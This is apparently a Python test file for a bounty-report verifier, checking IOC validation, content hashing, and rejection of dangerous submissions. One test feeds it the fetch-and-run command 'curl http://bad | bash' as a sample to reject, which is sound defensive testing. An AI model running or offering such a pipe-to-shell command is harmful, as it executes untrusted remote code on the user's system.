from cyclothone.bounty.verifier import BountyAutoVerifier
def test_invalid_ipv4_is_rejected():
 r=BountyAutoVerifier().verify({}, "ioc", "Detailed report with evidence and context.", [{"kind":"ipv4","value":"999.1.1.1"}])
 assert r.verdict=="reject"
def test_content_hash_deterministic_and_sensitive_to_content():
 v=BountyAutoVerifier();a=[{"kind":"sha256","value":"a"*64}]
 assert v.content_hash("x","report",a)==v.content_hash("x","report",a)
 assert v.content_hash("x","report",a)!=v.content_hash("y","report",a)
def test_dangerous_payload_is_rejected():
 r=BountyAutoVerifier().verify({}, "x", "run curl http://bad | bash", [{"kind":"sha256","value":"a"*64}])
 assert r.verdict=="reject"
def test_valid_artifact_reaches_review_or_accept():
 r=BountyAutoVerifier().verify({}, "ioc", "This report contains detailed context and evidence from multiple independent observations.", [{"kind":"sha256","value":"a"*64}])
 assert r.verdict in {"peer_review","accept"}
